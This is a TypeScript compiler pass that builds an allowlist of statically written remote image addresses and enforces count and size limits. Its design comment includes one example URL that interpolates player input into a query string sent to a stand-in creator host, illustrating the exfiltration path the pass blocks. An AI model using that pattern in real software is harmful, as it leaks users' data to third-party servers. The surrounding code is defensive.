import {
	canonicalRemoteAssetList,
	classifyRuntimeAssetValue,
} from "@rowcat/runtime/asset";
import ts from "typescript-compiler-api";

/**
 * Collects the remote image addresses written statically in source. This becomes the artifact's
 * allowlist.
 *
 * - Closes an exfiltration path. asset() creates a value and never asks where the string came
 *   from. Without this pass, asset(`https://creator.example/p.png?q=${input}`) would send player
 *   input in the query to the creator's server. The creator cannot read the response, but the
 *   address still arrives. RowCat fetching on the creator's behalf hides the IP, not the value.
 * - The rule is one question answered at compile time: did the address appear in the source as a
 *   complete static string? A literal, a substitution-free template, or a module-level literal
 *   constant (its text is in the source) counts. Templates with substitutions, concatenations and
 *   runtime values do not. A concatenated fixed prefix such as https://cdn.example.com/ may enter
 *   the list, but it is a destination the creator wrote by hand and carries no runtime value. The
 *   thing to block is the assembled result, which equals no literal.
 * - No scope analysis and no constant propagation. Those would turn this pass into half an
 *   evaluator, and an evaluator cannot finish without running creator code, which this compiler
 *   never does.
 * - Matching is not by call name. import { asset as img } and a creator helper such as
 *   cover('https://...') are legitimate uses, and narrowing by name would silently turn them into
 *   placeholders. The cost of the opposite error, an unused address in the list, opens nothing.
 * - Literal types (asset<const T extends string>) are not the boundary. A single `as any` passes
 *   them, and the authoritative artifact is produced by the server's compile, so its result must be
 *   the authority.
 */

/**
 * Upper bounds on the list an artifact may carry. These protect metadata and are separate from the
 * proxy's request limits.
 */
export const RUNTIME_REMOTE_ASSET_MANIFEST_LIMITS = {
	/** Number of addresses. No single work has a reason to declare more fixed images than this. */
	maxCount: 256,
	/**
	 * Total character length of the list. Counting entries alone would let 256 signed URLs of 8 KiB
	 * each become about 2 MiB of metadata sent to the player's device. Both axes must hold: how many,
	 * and how big (the same split as the remote image count and byte limits).
	 */
	maxTotalCharacters: 64 * 1024,
} as const;

/**
 * Whether a node is a complete static string. A template with substitutions (TemplateExpression)
 * never reaches here, because its pieces are TemplateHead and TemplateSpan, and neither matches.
 * That fact is the whole point of this function.
 */
const staticText = (node: ts.Node): string | null => {
	if (ts.isStringLiteral(node)) return node.text;
	if (ts.isNoSubstitutionTemplateLiteral(node)) return node.text;
	return null;
};

/**
 * Scans one source file for static strings read as remote addresses. The value check goes through
 * the same function the runtime uses (classifyRuntimeAssetValue). Writing a separate 'looks like an
 * address' check here would let values that asset() rejects into the list, or the reverse, and that
 * mismatch would only show up as a missing image.
 */
export function collectStaticRemoteAssets(file: ts.SourceFile): string[] {
	const found: string[] = [];
	const visit = (node: ts.Node): void => {
		const text = staticText(node);
		if (text !== null) {
			const target = classifyRuntimeAssetValue(text);
			if (target !== null && target.kind === "remote") found.push(target.url);
		}
		ts.forEachChild(node, visit);
	};
	ts.forEachChild(file, visit);
	return found;
}

/**
 * The project's remote asset list, deterministic. Canonicalization (canonicalRemoteAssetList from
 * @rowcat/runtime) sorts and deduplicates, so the per-repository file scan order does not leak
 * into the hash. The host's artifact validation calls the same function, so producer and reader
 * share one canonical form.
 *
 * This does not touch the network: whether an address is live is a playback-time question. If
 * publishing checked it, publishing would fail whenever a creator's CDN was briefly down.
 */
export function projectRemoteAssets(files: Iterable<ts.SourceFile>): string[] {
	const all: string[] = [];
	for (const file of files) all.push(...collectStaticRemoteAssets(file));
	return canonicalRemoteAssetList(all);
}

export function checkRemoteAssetManifest(
	urls: readonly string[],
): string | null {
	if (urls.length > RUNTIME_REMOTE_ASSET_MANIFEST_LIMITS.maxCount)
		return `This project declares more than ${RUNTIME_REMOTE_ASSET_MANIFEST_LIMITS.maxCount} remote image addresses (${urls.length}).`;
	let total = 0;
	for (const url of urls) total += url.length;
	if (total > RUNTIME_REMOTE_ASSET_MANIFEST_LIMITS.maxTotalCharacters)
		return `The total length of remote image addresses exceeds ${RUNTIME_REMOTE_ASSET_MANIFEST_LIMITS.maxTotalCharacters} characters (${total}).`;
	return null;
}
